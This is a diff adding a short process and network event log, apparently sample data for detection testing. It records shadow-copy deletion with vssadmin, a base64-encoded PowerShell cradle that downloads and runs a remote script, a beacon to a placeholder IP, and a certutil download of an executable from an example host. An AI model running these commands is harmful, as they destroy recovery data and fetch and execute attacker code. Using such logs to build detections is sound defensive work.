@@ -1,0 +1,4 @@
+2026-11-10 12:00:01 [PROC_SPAWN] PID=4102 parent=cmd.exe command="vssadmin delete shadows /all /quiet"
+2026-11-10 12:00:05 [PROC_SPAWN] PID=4108 image=powershell.exe args="powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC45OTo4MDgwL2lucHV0LnBzMScp"
+2026-11-10 12:00:10 [NET_CONN] PID=4108 dest_ip=198.51.100.99 dest_port=8080 url="http://198.51.100.99:8080/beacon"
+2026-11-10 12:00:15 [PROC_SPAWN] PID=4112 image=certutil.exe args="certutil -urlcache -f http://staging-host.example.org/agent.bin agent.exe"
